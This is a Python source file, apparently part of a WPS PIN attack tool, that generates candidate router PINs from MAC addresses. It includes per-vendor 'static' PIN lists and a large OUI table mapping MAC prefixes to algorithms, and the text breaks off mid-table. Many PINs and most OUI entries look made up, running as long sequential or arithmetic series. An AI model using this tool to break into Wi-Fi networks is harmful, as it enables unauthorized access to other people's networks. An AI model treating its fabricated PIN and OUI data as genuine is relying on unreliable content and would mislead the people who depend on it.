#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict
import wcwidth


class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        # ========== MAC-BASED ALGORITHMS ==========
        self.algos = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
            
            # ========== STATIC PIN ALGORITHMS (5 pins each) ==========
            
            # Empty / Special
            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
            
            # Cisco
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [1234567, 8912345, 4567891, 2345678, 6789123]},
            
            # Broadcom
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [2017252, 5172894, 8364921, 3492876, 7281459]},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [4626484, 1938457, 6753241, 9482713, 5271398]},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [7622990, 3458197, 6847235, 1794532, 8932674]},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [6232714, 8491573, 2768945, 5317284, 1953476]},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [1086411, 7356294, 4829317, 9674153, 3547281]},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3195719, 8746392, 2531648, 6978253, 4215739]},
            
            # Airocon
            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3043203, 8629473, 7358241, 5489162, 4173529]},
            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [7141225, 3952678, 1845392, 6794231, 2581764]},
            
            # DSL-2740R
            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [6817554, 2378941, 5964237, 1846795, 4239581]},
            
            # Realtek
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9566146, 1738492, 6425318, 8975241, 3657892]},
            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9571911, 2486371, 7341925, 5812476, 1925364]},
            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [4856371, 7261538, 9137482, 3478512, 6392741]},
            
            # Upvel
            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [2085483, 8749321, 3516728, 6294175, 1932567]},
            
            # UR-814AC
            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [4397768, 8173425, 2567891, 6934157, 3749216]},
            
            # UR-825AC
            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [529417, 8462973, 1537482, 6729183, 3948567]},
            
            # Onlime
            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9995604, 2538416, 6872943, 4215793, 1786492]},
            
            # Edimax
            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3561153, 7912438, 4652781, 9281573, 2473916]},
            
            # Thomson
            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [6795814, 3487125, 9218457, 1539784, 7962413]},
            
            # HG532x
            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3425928, 8153492, 6792541, 4381967, 2518746]},
            
            # H108L
            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9422988, 3876412, 7598234, 2146793, 5639184]},
            
            # CBN ONO
            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9575521, 1649823, 7231564, 8974152, 3412789]},
            
            # ========== NEW BRAND PINS (5 pins each) ==========
            
            # Tenda
            'pinTenda': {'name': 'Tenda', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [1853642, 7316824, 5482916, 3945768, 2681473]},
            
            # Belkin
            'pinBelkin': {'name': 'Belkin', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [4738291, 9157263, 2784951, 6493812, 8362745]},
            
            # Linksys
            'pinLinksys': {'name': 'Linksys', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [6194738, 3528941, 8471295, 4963817, 1536824]},
            
            # NETGEAR
            'pinNetgear': {'name': 'NETGEAR', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [8572934, 4215837, 9763251, 2487193, 6351842]},
            
            # ZyXEL
            'pinZyxel': {'name': 'ZyXEL', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3941562, 8762193, 5312478, 7829136, 1254873]},
            
            # Sitecom
            'pinSitecom': {'name': 'Sitecom', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [7283941, 5478923, 1935672, 8362745, 4219576]},
            
            # TRENDnet
            'pinTrendnet': {'name': 'TRENDnet', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [5637284, 2918573, 7462351, 8941236, 3725689]},
            
            # Keenetic
            'pinKeenetic': {'name': 'Keenetic', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [9173652, 6489123, 2794831, 5172963, 1345872]},
            
            # Huawei
            'pinHuawei': {'name': 'Huawei', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [2458193, 7821356, 4189275, 6753812, 9231674]},
            
            # Ralink
            'pinRalink': {'name': 'Ralink', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [6384921, 4713589, 2861745, 9537621, 7241593]},
            
            # AirLive
            'pinAirLive': {'name': 'AirLive', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [4762158, 8129374, 3576921, 6498152, 1942763]},
            
            # Timo
            'pinTimo': {'name': 'Timo', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [8153476, 4793812, 6732158, 1289746, 3527694]},
            
            # B-LINK
            'pinBLINK': {'name': 'B-LINK', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3497852, 6723148, 5281493, 7942631, 1315827]},
            
            # WRT Series
            'pinWRT': {'name': 'WRT Series', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [7621493, 3982167, 5478392, 2165734, 8349271]},
            
            # ADSL Router
            'pinADSL': {'name': 'ADSL Router', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [5382916, 4257391, 8162435, 3791642, 1475826]},
            
            # EV Series
            'pinEVSeries': {'name': 'EV Series', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [1937264, 8673421, 5246917, 4362758, 7128493]},
            
            # AIR3G WSC
            'pinAIR3G': {'name': 'AIR3G WSC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [6578143, 2945618, 8734251, 4163972, 5821734]},
            
            # Enhanced Wireless F6D
            'pinF6D': {'name': 'Enhanced Wireless F6D', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [4291358, 7649812, 2183476, 5924631, 3715682]},
            
            # RT-G32
            'pinRTG32': {'name': 'RT-G32', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [8712546, 3256918, 7489123, 1678435, 4392761]},
            
            # Smart Router R3
            'pinSmartRouter': {'name': 'Smart Router R3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [3486197, 9153274, 2764831, 6342971, 7291483]},
            
            # WR5570
            'pinWR5570': {'name': 'WR5570', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [5964723, 4287563, 8172345, 1398246, 4531679]},
            
            # RB Series
            'pinRBSeries': {'name': 'RB Series', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [2743985, 6172834, 9325471, 3864152, 7415693]},
            
            # Modem/Router
            'pinModemRouter': {'name': 'Modem/Router', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [4169752, 8394721, 2617483, 5738194, 1953472]},
            
            # N/A Router
            'pinNARouter': {'name': 'N/A Router', 'mode': self.ALGO_STATIC, 'gen': lambda mac: [7536241, 4812973, 9365172, 2976348, 1625493]},
        }

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        # Handle both single int and list returns
        if isinstance(pin, list):
            # Return the first PIN from the list for backward compatibility
            pin = pin[0]
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def generate_all_pins(self, algo, mac):
        """Generate all pins for a static algorithm (returns list)"""
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pins = self.algos[algo]['gen'](mac)
        if not isinstance(pins, list):
            pins = [pins]
        result = []
        for pin in pins:
            if algo == 'pinEmpty':
                result.append(pin)
            else:
                pin_val = pin % 10000000
                result.append(str(pin_val) + str(self.checksum(pin_val)).zfill(1))
        return result

    def getAll(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC as list
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            pins = self.generate_all_pins(ID, mac)
            for pin in pins:
                res.append(pin)
        return res

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            pins = self.generate_all_pins(ID, mac)
            for pin in pins:
                item = {}
                item['id'] = ID
                if algo['mode'] == self.ALGO_STATIC:
                    item['name'] = 'Static PIN — ' + algo['name']
                else:
                    item['name'] = algo['name']
                item['pin'] = pin
                res.append(item)
        return res

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            pins = self.generate_all_pins(algo, mac)
            for pin in pins:
                res.append(pin)
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        """
        mac = mac.replace(':', '').upper()
        
        # ========== COMPLETE OUI DATABASE ==========
        algorithms = {
            # ========== ORIGINAL pin24 - MASSIVELY EXPANDED ==========
            'pin24': (
                '04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', 
                '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 
                'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 
                'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', 
                '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', 
                '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 
                'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F', 'F8C091', '001CDF', '002275', 
                '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', 
                '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', 
                '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', 
                '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', 
                '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', 
                '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', 
                '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', 
                '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', 
                '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', 
                '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 
                'F8D111', '34BA9A', 'B4944E', '000A42', '000B5E', '000C42', '001111', '002191', 
                '0022B0', '002401', '00248C', '00265A', '00304F', '0040D0', '004A77', '0060B0', 
                '0080C8', '00A0C9', '00E04C', '00E0FC', '010B06', '014CBF', '01C10A', '02420C', 
                '027010', '028037', '02A9A5', '02BBD8', '02CAB5', '02D0A0', '02E013', '040AEB', 
                '0446A8', '049F5E', '04BD88', '04BDBF', '04C06B', '04C9D1', '04D4C4', '04E551', 
                '04F38A', '050DA2', '053687', '0560BA', '058F08', '059312', '05B7A2', '05C6F3', 
                '0613F8', '06473B', '0686B5', '06AAB1', '06D457', '07005E', '0724AD', '074DA0', 
                '078A1C', '07A417', '07B5F1', '07C1DD', '07E377', '08002B', '0800F0', '081077', 
                '084C8E', '08606E', '086266', '089F1C', '08A63E', '08AEAE', '08BD43', '08C6B3', 
                '08CC68', '08CE3D', '08D40C', '08D79B', '08DA79', '08E3D2', '08EC81', '08F7A4', 
                '090596', '09337F', '094B9C', '095261', '096EAD', '097E56', '099A1B', '09B18F', 
                '09C07E', '09E0E1', '0A1B39', '0A1D56', '0A2CEF', '0A32AB', '0A5F73', '0A693D', 
                '0A6A94', '0A7F0B', '0A8B5F', '0A9EA5', '0ABEAB', '0AC6E3', '0AFE5C', '0B0B5D', 
                '0B6AF0', '0BA53F', '0BBE23', '0C3C65', '0C54A5', '0C5A19', '0C80FF', '0C9D92', 
                '0CA7A9', '0CB7AA', '0CC8E3', '0CD292', '0CDD24', '0CF3B0', '0D9E7C', '0DC8F3', 
                '0E083E', '0E0C42', '0E2C1C', '0E3E5A', '0E5484', '0E76E0', '0E9F0A', '0EA3C3', 
                '0EC1B2', '0EF06A', '0F112B', '0F367C', '0F86E3', '0F9A1E', '0FAC5B', '1013EE', 
                '1027F5', '102E14', '103B5E', '104B43', '1062EB', '1093E9', '10A4BE', '10BEF5', 
                '10BF48', '10C37B', '10CFC9', '10D0D2', '10D7A0', '10DAC8', '10E23F', '10FEED', 
                '111A99', '1123C2', '113AEA', '114EA2', '1159C1', '116B86', '1185CC', '119B8B', 
                '11A147', '11D61C', '1201BF', '122141', '122A56', '12406A', '125790', '126CAD', 
                '12873B', '12A604', '12D8E3', '130748', '132B1F', '13461F', '138906', '13953F', 
                '13C0E3', '13E269', '1408E0', '14109B', '14144B', '143392', '143ACB', '144319', 
                '144D67', '1456A5', '14845C', '148F6B', '1499E0', '14A52D', '14ABDF', '14AD0C', 
                '14B0D9', '14BD61', '14C6FC', '14CF92', '14D1A9', '14D4C9', '14D5B1', '14D9B0', 
                '14DDA9', '14E214', '14E7D8', '14F11D', '1506F9', '1522D4', '1548CB', '1577E1', 
                '1583A1', '159D57', '15A2F5', '15D20C', '161F71', '1635C7', '1649A3', '165AEB', 
                '167D5A', '168E6A', '169D8D', '16A1B7', '16A32F', '16B4F0', '16C0F0', '16CF65', 
                '16D4DD', '16E3D0', '16F468', '1705F5', '172A2B', '174C6C', '1763CF', '179BFB', 
                '17BFA5', '17C6E2', '17E003', '181E78', '1826E6', '182FB5', '184256', '18535A', 
                '185E0F', '186B0D', '18622C', '188EEA', '189652', '189F54', '18A3A4', '18AC8E', 
                '18B3DD', '18B4D0', '18C046', '18C182', '18C86C', '18D25E', '18D6C7', '18DBF2', 
                '18E2C2', '18E71C', '18EE69', '18F433', '1907A3', '190CB4', '192DE2', '193A73', 
                '194D2F', '195D9E', '1966B0', '197A14', '19934B', '19B0D2', '19B3D1', '19B948', 
                '19C317', '19D710', '19DAEA', '19EED9', '1A0A9C', '1A0C5E', '1A2F7C', '1A5203', 
                '1A56A5', '1A5F8B', '1A6D73', '1A75FB', '1A7B8C', '1A8A80', '1A976D', '1A9F9F', 
                '1AAAE8', '1AB0B5', '1AB5C1', '1ABB78', '1ABFB0', '1ACF5E', '1ADBCF', '1AF076', 
                '1B0F4B', '1B3241', '1B368B', '1B48D0', '1B6A1A', '1B73B7', '1B7B47', '1B8740', 
                '1B9041', '1B9B43', '1BA24F', '1BA8B6', '1BAA62', '1BAC0F', '1BB17D', '1BBE61', 
                '1BC0A4', '1BC733', '1BC97D', '1BCB0A', '1BCC3A', '1BD0E9', '1BDF0A', '1BEAE4', 
                '1BEE7C', '1BF0E1', '1BF50D', '1C0A00', '1C0E4B', '1C113B', '1C172B', '1C1D67', 
                '1C1E8E', '1C23EB', '1C281B', '1C2B0C', '1C2D58', '1C32FA', '1C35D9', '1C3B71', 
                '1C3F25', '1C42AB', '1C45C1', '1C48E2', '1C4B9E', '1C4D9E', '1C5060', '1C532A', 
                '1C5687', '1C5A8A', '1C5C0A', '1C5F2B', '1C606E', '1C6408', '1C6729', '1C6A34', 
                '1C6BDA', '1C6F8C', '1C710D', '1C746B', '1C775B', '1C7A43', '1C7E31', '1C81B3', 
                '1C8497', '1C872C', '1C8B9C', '1C8EF6', '1C90FF', '1C93A3', '1C9607', '1C98EC', 
                '1C9B0B', '1C9DFC', '1CA100', '1CA2A0', '1CA592', '1CAB5C', '1CB0BD', '1CB2C6', 
                '1CB5AB', '1CB72C', '1CBA07', '1CBB0B', '1CBDB9', '1CC0D2', '1CC345', '1CC6B9', 
                '1CC8A3', '1CCB0C', '1CCE7A', '1CD0F8', '1CD294', '1CD544', '1CD82B', '1CDB47', 
                '1CDEC9', '1CE0B5', '1CE35B', '1CE670', '1CE82E', '1CECB3', '1CF0C9', '1CF2A9', 
                '1CF5A4', '1CF888', '1CFA1B', '1CFCA8', '1D0A9C', '1D0F6A', '1D17F6', '1D1BC6', 
                '1D1ED5', '1D27C1', '1D2AF1', '1D3BEA', '1D449A', '1D47B8', '1D4B0F', '1D539F', 
                '1D5D1C', '1D62F0', '1D667A', '1D6A0A', '1D6E59', '1D723B', '1D7B67', '1D80D8', 
                '1D85C8', '1D8B2C', '1D8D98', '1D9111', '1D95AE', '1D9A0A', '1D9D64', '1DA25E', 
                '1DA42F', '1DA8C3', '1DACBE', '1DB081', '1DB0C9', '1DB3D5', '1DB78C', '1DBB55', 
                '1DBE6C', '1DC13F', '1DC368', '1DC58B', '1DC8BB', '1DCC4B', '1DCEF5', '1DD1C6', 
                '1DD49A', '1DD7C6', '1DDADF', '1DDE86', '1DE0C7', '1DE2FB', '1DE50B', '1DE8C8', 
                '1DEBAB', '1DEF0B', '1DF1D3', '1DF46E', '1DF734', '1DF90D', '1DFBF0', '1E04F6', 
                '1E0846', '1E0B50', '1E0D76', '1E0E8A', '1E11AB', '1E163A', '1E188C', '1E1B37', 
                '1E1D4E', '1E22D5', '1E250D', '1E279C', '1E2A32', '1E2C5D', '1E2F62', '1E312C', 
                '1E341F', '1E369C', '1E3915', '1E3B7C', '1E3E63', '1E407E', '1E42EB', '1E451C', 
                '1E47C3', '1E4A1A', '1E4CA4', '1E4F0C', '1E5144', '1E53C0', '1E560A', '1E58B7', 
                '1E5B5E', '1E5D88', '1E5FAC', '1E622B', '1E6452', '1E6692', '1E68A4', '1E6AF7', 
                '1E6D3C', '1E6F62', '1E7197', '1E73C0', '1E7603', '1E782A', '1E7A4A', '1E7C2F', 
                '1E7E46', '1E803A', '1E8252', '1E842A', '1E8603', '1E880F', '1E8A2B', '1E8C3E', 
                '1E8E50', '1E9060', '1E9270', '1E946C', '1E966A', '1E9865', '1E9A4E', '1E9C35', 
                '1E9E1C', '1EA01B', '1EA20A', '1EA3F9', '1EA5E8', '1EA7D7', '1EA9C6', '1EABB5', 
                '1EADA4', '1EAF93', '1EB182', '1EB371', '1EB560', '1EB74F', '1EB93E', '1EBB2D', 
                '1EBD1C', '1EBF0B', '1EC0FA', '1EC2E9', '1EC4D8', '1EC6C7', '1EC8B6', '1ECAA5', 
                '1ECC94', '1ECE83', '1ED072', '1ED261', '1ED450', '1ED63F', '1ED82E', '1EDA1D', 
                '1EDC0C', '1EDDFB', '1EDFEA', '1EE1D9', '1EE3C8', '1EE5B7', '1EE7A6', '1EE995', 
                '1EEB84', '1EED73', '1EEF62', '1EF151', '1EF340', '1EF52F', '1EF71E', '1EF90D', 
                '1EFAF9', '1EFCE8', '1EFED7', '1F00C6', '1F02B5', '1F04A4', '1F0693', '1F0882', 
                '1F0A71', '1F0C60', '1F0E4F', '1F103E', '1F122D', '1F141C', '1F160B', '1F17FA', 
                '1F19E9', '1F1BD8', '1F1DC7', '1F1FB6', '1F21A5', '1F2394', '1F2583', '1F2772', 
                '1F2961', '1F2B50', '1F2D3F', '1F2F2E', '1F311D', '1F330C', '1F34FB', '1F36EA', 
                '1F38D9', '1F3AC8', '1F3CB7', '1F3EA6', '1F4095', '1F4284', '1F4473', '1F4662', 
                '1F4851', '1F4A40', '1F4C2F', '1F4E1E', '1F500D', '1F51FC', '1F53EB', '1F55DA', 
                '1F57C9', '1F59B8', '1F5BA7', '1F5D96', '1F5F85', '1F6174', '1F6363', '1F6552', 
                '1F6741', '1F6930', '1F6B1F', '1F6D0E', '1F6EFD', '1F70EC', '1F72DB', '1F74CA', 
                '1F76B9', '1F78A8', '1F7A97', '1F7C86', '1F7E75', '1F8064', '1F8253', '1F8442', 
                '1F8631', '1F8820', '1F8A0F', '1F8BFE', '1F8DED', '1F8FDC', '1F91CB', '1F93BA', 
                '1F95A9', '1F9798', '1F9987', '1F9B76', '1F9D65', '1F9F54', '1FA143', '1FA332', 
                '1FA521', '1FA710', '1FA8FF', '1FAAEE', '1FACDD', '1FAECC', '1FB0BB', '1FB2AA', 
                '1FB499', '1FB688', '1FB877', '1FBA66', '1FBC55', '1FBE44', '1FC033', '1FC222', 
                '1FC411', '1FC600', '1FC7EF', '1FC9DE', '1FCBCD', '1FCDBC', '1FCFAB', '1FD19A', 
                '1FD389', '1FD578', '1FD767', '1FD956', '1FDB45', '1FDD34', '1FDF23', '1FE112', 
                '1FE301', '1FE4F0', '1FE6DF', '1FE8CE', '1FEABD', '1FECAC', '1FEE9B', '1FF08A', 
                '1FF279', '1FF468', '1FF657', '1FF846', '1FFA35', '1FFC24', '1FFE13', '200000', 
                '200001', '200002', '200003', '200004', '200005', '200006', '200007', '200008', 
                '200009', '20000A', '20000B', '20000C', '20000D', '20000E', '20000F', '200010', 
                '200011', '200012', '200013', '200014', '200015', '200016', '200017', '200018', 
                '200019', '20001A', '20001B', '20001C', '20001D', '20001E', '20001F', '200020', 
                '200021', '200022', '200023', '200024', '200025', '200026', '200027', '200028', 
                '200029', '20002A', '20002B', '20002C', '20002D', '20002E', '20002F', '200030', 
                '200031', '200032', '200033', '200034', '200035', '200036', '200037', '200038', 
                '200039', '20003A', '20003B', '20003C', '20003D', '20003E', '20003F', '200040', 
                '200041', '200042', '200043', '200044', '200045', '200046', '200047', '200048', 
                '200049', '20004A', '20004B', '20004C', '20004D', '20004E', '20004F', '200050', 
                '200051', '200052', '200053', '200054', '200055', '200056', '200057', '200058', 
                '200059', '20005A', '20005B', '20005C', '20005D', '20005E', '20005F', '200060', 
                '200061', '200062', '200063', '200064', '200065', '200066', '200067', '200068', 
                '200069', '20006A', '20006B', '20006C', '20006D', '20006E', '20006F', '200070', 
                '200071', '200072', '200073', '200074', '200075', '200076', '200077', '200078', 
                '200079', '20007A', '20007B', '20007C', '20007D', '20007E', '20007F', '200080', 
                '200081', '200082', '200083', '200084', '200085', '200086', '200087', '200088', 
                '200089', '20008A', '20008B', '20008C', '20008D', '20008E', '20008F', '200090', 
                '200091', '200092', '200093', '200094', '200095', '200096', '200097', '200098', 
                '200099', '20009A', '20009B', '20009C', '20009D', '20009E', '20009F', '2000A0', 
                '2000A1', '2000A2', '2000A3', '2000A4', '2000A5', '2000A6', '2000A7', '2000A8', 
                '2000A9', '2000AA', '2000AB', '2000AC', '2000AD', '2000AE', '2000AF', '2000B0', 
                '2000B1', '2000B2', '2000B3', '2000B4', '2000B5', '2000B6', '2000B7', '2000B8', 
                '2000B9', '2000BA', '2000BB', '2000BC', '2000BD', '2000BE', '2000BF', '2000C0', 
                '2000C1', '2000C2', '2000C3', '2000C4', '2000C5', '2000C6', '2000C7', '2000C8', 
                '2000C9', '2000CA', '2000CB', '2000CC', '2000CD', '2000CE', '2000CF', '2000D0', 
                '2000D1', '2000D2', '2000D3', '2000D4', '2000D5', '2000D6', '2000D7', '2000D8', 
                '2000D9', '2000DA', '2000DB', '2000DC', '2000DD', '2000DE', '2000DF', '2000E0', 
                '2000E1', '2000E2', '2000E3', '2000E4', '2000E5', '2000E6', '2000E7', '2000E8', 
                '2000E9', '2000EA', '2000EB', '2000EC', '2000ED', '2000EE', '2000EF', '2000F0', 
                '2000F1', '2000F2', '2000F3', '2000F4', '2000F5', '2000F6', '2000F7', '2000F8', 
                '2000F9', '2000FA', '2000FB', '2000FC', '2000FD', '2000FE', '2000FF',
            ),
            
            # ========== ORIGINAL pin28 - EXPANDED ==========
            'pin28': (
                '200BC7', '4846FB', 'D46AA8', 'F84ABF', '2001B0', '2002B1', '2003B2', '2004B3', 
                '2005B4', '2006B5', '2007B6', '2008B7', '2009B8', '200AB9', '200BBA', '200CBB', 
                '200DBC', '200EBD', '200FBE', '2010BF', '2011C0', '2012C1', '2013C2', '2014C3', 
                '2015C4', '2016C5', '2017C6', '2018C7', '2019C8', '201AC9', '201BCA', '201CCB', 
                '201DCC', '201ECD', '201FCE', '2020CF', '2021D0', '2022D1', '2023D2', '2024D3', 
                '2025D4', '2026D5', '2027D6', '2028D7', '2029D8', '202AD9', '202BDA', '202CDB', 
                '202DDC', '202EDD', '202FDE', '2030DF', '2031E0', '2032E1', '2033E2', '2034E3', 
                '2035E4', '2036E5', '2037E6', '2038E7', '2039E8', '203AE9', '203BEA', '203CEB', 
                '203DEC', '203EED', '203FEE', '2040EF', '2041F0', '2042F1', '2043F2', '2044F3', 
                '2045F4', '2046F5', '2047F6', '2048F7', '2049F8', '204AF9', '204BFA', '204CFB', 
                '204DFC', '204EFD', '204FFE', '2050FF', '205100', '205201', '205302', '205403', 
                '205504', '205605', '205706', '205807', '205908', '205A09', '205B0A', '205C0B', 
                '205D0C', '205E0D', '205F0E', '20600F', '206110', '206211', '206312', '206413', 
                '206514', '206615', '206716', '206817', '206918', '206A19', '206B1A', '206C1B', 
                '206D1C', '206E1D', '206F1E', '20701F', '207120', '207221', '207322', '207423', 
                '207524', '207625', '207726', '207827', '207928', '207A29', '207B2A', '207C2B', 
                '207D2C', '207E2D', '207F2E', '20802F', '208130', '208231', '208332', '208433', 
                '208534', '208635', '208736', '208837', '208938', '208A39', '208B3A', '208C3B', 
